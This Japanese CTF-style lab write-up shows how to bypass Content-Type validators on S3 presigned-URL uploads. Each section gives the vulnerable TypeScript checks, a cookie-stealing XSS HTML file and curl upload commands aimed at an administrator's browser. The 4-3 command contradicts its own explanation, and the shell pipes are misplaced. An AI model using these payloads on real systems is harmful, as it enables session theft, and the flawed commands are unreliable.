# シナリオ 4 - Validation の Bypass と任意の HTML ファイルのアップロード

[English](./README.en.md) / [Top](../../README.md)

## 全体概要

このシナリオは、Validation の Bypass と任意の HTML ファイルのアップロードを模したアプリケーションと管理者がチャレンジの対象となります。チャレンジの最終的な目的は、問い合わせ窓口の先にいる管理者の Cookie を取得することです。

また、このシナリオ 4 では、シナリオ 1,2,3 のチャレンジを前提としていますので、それらのシナリオを先にチャレンジしてください。

**前提となるシナリオ**

- [シナリオ 1 - SDK を用いた任意の HTML ファイルのアップロード](../scenario1/README.md)
- [シナリオ 2 - 署名付き URL を用いた任意の HTML ファイルのアップロード](../scenario2/README.md)
- [シナリオ 3 - POST Policy を用いた任意の HTML ファイルのアップロード](../scenario3/README.md)

また、このシナリオの構成に関しても、シナリオ 1,2,3 と同様の構成となっています。

![scenario4](./design.png)

## 4-1 後方一致における Validation の Bypass (Is the end safe?)

### 起動

```sh
make start-Scenario4-1
```

### 概要

このシナリオでは、`Content-Type` を表現する文字列を用いて、Validation における後方一致時のチェックのバイパスについて学びます。

### Content-Type の表現 - 1 Parameter

Content-Type(正確には Mime Type の話ですが、便宜上は Content-Type と表現します)は、`type/subtype; parameter`という形式で表現されます。例えば、`image/png`や`text/html; charset=utf-8`などがその例です。

`text/html; charset=utf-8`のように、セミコロンを用いることで、`type/subtype`の後にレンダリングに必要なパラメータを付与することが可能です。

この表現方法を用いることで、`text/html; image/png`というように、`image/png`で終わる任意の文字列を指定することが可能になります。この表現を用いた場合、`text/html`としてレンダリングされるのみで、後方の`image/png`は無視されます。

### Solution

ここからは、後方一致における Validation の Bypass に関するチャレンジの解決策を示します。

#### 動作の整理

対象となるアプリケーションでは、以下のような動作を行います。

1. User は Application のエンドポイントに対してファイルをアップロードするリクエストを送信します。
2. Application は、リクエストを受け取り、そのファイルを S3 にアップロード可能な署名付き URL を生成します。
   - 署名付き URL を生成する際に、ユーザーの入力としては、`contentType`と`length`のみを受け取ります。
   - この際、`contentType`は、`text/html; image/png`というように、`image/png`で終わる任意の文字列を指定することが可能で、`length`は、任意の数値を指定することが可能です。
   - このように、`contentType`では、`image/png`で終わる任意の文字列を指定することで、`text/html`としてレンダリングされるファイルのアップロードが可能な署名付き URL を生成することが可能です。
3. Application は、生成した署名付き URL を User に返します。
4. User は、生成した署名付き URL を用いて、ファイルを S3 にアップロードします。
5. S3 は、User がアップロードしたファイルを受け取り、そのファイルを保存します。

#### ソースコードの確認

基本的にはシナリオ 1,2,3 と同様の実装となっていますが、`getSignedUrl` 関数を用いて、署名付き URL を生成する前段階で、複数のチェックを行っています。

このチェックは、`contentType`の後方一致をチェックしています。

`cdk/lib/scenario4_1/application/src/app.ts` の `/api/upload` に実装が行われています。

```typescript
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const contentTypeValidator = (contentType: string) => {
    if (contentType.endsWith('image/png')) return true;
    if (contentType.endsWith('image/jpeg')) return true;
    if (contentType.endsWith('image/jpg')) return true;
    return false;
  };

  if (!contentTypeValidator(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-length']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
```

これらのチェックを通過した場合、`text/html;image/png`というように、`image/png`で終わる任意の文字列を指定することで、任意の HTML ファイルをアップロードすることが可能です。

### 攻略の糸口

このチャレンジでは、`contentType`の後方一致をチェックしていることがポイントとなります。

`text/html;image/png`というように、`image/png`で終わる任意の文字列を指定することで、任意の HTML ファイルをアップロードすることが可能です。

大まかな流れはシナリオ 1 と同様です。

以下の HTML ファイルを `xss.html` として保存します。

```html
<!-- xss.html -->
<html>
  <body>
    <script>
      document.getElementsByTagName('body')[0].innerHTML = `${document.cookie.split('=')[1]}`;
    </script>
  </body>
</html>
```

保存した HTML ファイルを用いて、以下のようなコマンドを実行します。

```sh
TARGET_HOST="....."
FILE=xss.html
LENGTH=$(stat -c %s $FILE)
URL=$(curl -X POST https://${TARGET_HOST}/api/upload \
  -H "Content-Type: application/json" \
  -d '{"contentType":"text/html;image/png","length":'$LENGTH'}') | jq -r '.url'
curl -X PUT $URL --upload-file $FILE -H "Content-Type: text/html;image/png"
```

その後、出力された URL を Report URL に入力することで、管理者の画面で任意の JavaScript を実行することが可能です。
実行後は、`/delivery/{uuid}`の S3 に保存されたファイルを閲覧することで、管理者の Cookie を含んだ HTML ファイルを閲覧することが可能です。

## 4-2 前方一致における Validation の Bypass (forward priority...)

### 起動

```sh
make start-Scenario4-2
```

### 概要

このシナリオでは、`Content-Type` を表現する文字列を用いて、Validation における前方一致時のチェックのバイパスについて学びます。

### Content-Type の表現 - 2 配列指定

`text/html; charset=utf-8`のように、セミコロンを用いることで、`type/subtype`の後にレンダリングに必要なパラメータを付与することが可能と先に解説をしましたが、

この表現では、前方に設定された`type/subtype`のみが有効となります。

そこで、RFC8941 の Structured Field Values for HTTP において定義される、構造体としての表現を用いることで、前方一致時のチェックをバイパスすることが可能になります。

この構造体としての表現は、`type1/subtype1, type2/subtype2`という形式で表現されます。
この表現はブラウザの挙動において、後方が優先されることがあるため、`type1/subtype1, type2/subtype2`という形式で表現された場合、`type2/subtype2`が優先されることがあります。

https://fetch.spec.whatwg.org/#example-extract-a-mime-type

### Solution

#### ソースコードの確認

おおよそのソースコードはシナリオ 2 と同様の実装となっています。

`cdk/lib/scenario4_2/application/src/app.ts` の `/api/upload` に実装が行われています。

```typescript
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  if (request.body.contentType.includes(';')) {
    return reply.code(400).send({ error: 'No file type (only type/subtype)' });
  }

  const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
  if (!allow.test(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-length']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
```

これらのチェックを通過した場合、`image/png,text/html`というように、`image/png`から始まる任意の文字列を指定することで、任意の HTML ファイルをアップロードすることが可能です。

### 攻略の糸口

このチャレンジでは、`contentType`の前方一致をチェックしていることがポイントとなります。

`image/png,text/html`というように、`image/png`から始まる任意の文字列を指定することで、任意の HTML ファイルをアップロードすることが可能です。

大まかな流れはシナリオ 4-1 と同様です。

以下の HTML ファイルを `xss.html` として保存します。

```html
<!-- xss.html -->
<html>
  <body>
    <script>
      document.getElementsByTagName('body')[0].innerHTML = `${document.cookie.split('=')[1]}`;
    </script>
  </body>
</html>
```

保存した HTML ファイルを用いて、以下のようなコマンドを実行します。

```sh
TARGET_HOST="....."
FILE=xss.html
LENGTH=$(stat -c %s $FILE)
URL=$(curl -X POST https://${TARGET_HOST}/api/upload \
  -H "Content-Type: application/json" \
  -d '{"contentType":"image/png,text/html","length":'$LENGTH'}') | jq -r '.url'
curl -X PUT $URL --upload-file $FILE -H "Content-Type: image/png,text/html"
```

その後、出力された URL を Report URL に入力することで、管理者の画面で任意の JavaScript を実行することが可能です。
実行後は、`/delivery/{uuid}`の S3 に保存されたファイルを閲覧することで、管理者の Cookie を含んだ HTML ファイルを閲覧することが可能です。

## 4-3 include における Validation の Bypass (Just included?)

### 起動

```sh
make start-Scenario4-3
```

### 概要

このシナリオでは、`Content-Type` を表現する文字列を用いて、Validation における include 時のチェックのバイパスについて学びます。

先の 4-1 及び 4-2 で学んだ仕様を用いることで、任意の HTML ファイルをアップロードすることが可能です。

このシナリオでは、`image/png,text/html`というように、`image/png`から始まる任意の文字列及び、`text/html;image/png`というように、`image/png`で終わる任意の文字列を指定することで、任意の HTML ファイルをアップロードすることが可能です。

### Solution

#### ソースコードの確認

おおよそのソースコードはシナリオ 2 と同様の実装となっています。

`cdk/lib/scenario4_3/application/src/app.ts` の `/api/upload` に実装が行われています。

```typescript
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const allowContentTypes = ['image/png', 'image/jpeg', 'image/jpg'];

  const isAllowContentType = allowContentTypes.filter((contentType) => request.body.contentType.startsWith(contentType) && request.body.contentType.endsWith(contentType));
  if (isAllowContentType.length === 0) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-length']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
```

### 攻略の糸口

このチャレンジでは、`contentType`の include 時のチェックをバイパスすることがポイントとなります。

`image/png,text/html`というように、`image/png`から始まる任意の文字列を指定し、`text/html`とブラウザで解釈されることが攻略の糸口となります。

先のシナリオ 4-1 及び 4-2 で学んだ仕様では、`;`の後ろにある文字列は Parameter として解釈され、`,`は構造体として、後方優先をされることがわかりました。

これらを用いると、先頭と末尾が共に`image/png`である任意の文字列を指定することが可能になります。

例えば、`image/png,text/html;image/png`というように、`image/png`で始まり、`image/png`で終わる任意の文字列を指定することで、任意の HTML ファイルをアップロードすることが可能です。

ここからの流れはシナリオ 4-1 と同様です。

以下の HTML ファイルを `xss.html` として保存します。

```html
<!-- xss.html -->
<html>
  <body>
    <script>
      document.getElementsByTagName('body')[0].innerHTML = `${document.cookie.split('=')[1]}`;
    </script>
  </body>
</html>
```

保存した HTML ファイルを用いて、以下のようなコマンドを実行します。

```sh
TARGET_HOST="....."
FILE=xss.html
LENGTH=$(stat -c %s $FILE)
URL=$(curl -X POST https://${TARGET_HOST}/api/upload \
  -H "Content-Type: application/json" \
  -d '{"contentType":"image/png,text/html","length":'$LENGTH'}') | jq -r '.url'
curl -X PUT $URL --upload-file $FILE -H "Content-Type: image/png,text/html"
```

その後、出力された URL を Report URL に入力することで、管理者の画面で任意の JavaScript を実行することが可能です。
実行後は、`/delivery/{uuid}`の S3 に保存されたファイルを閲覧することで、管理者の Cookie を含んだ HTML ファイルを閲覧することが可能です。
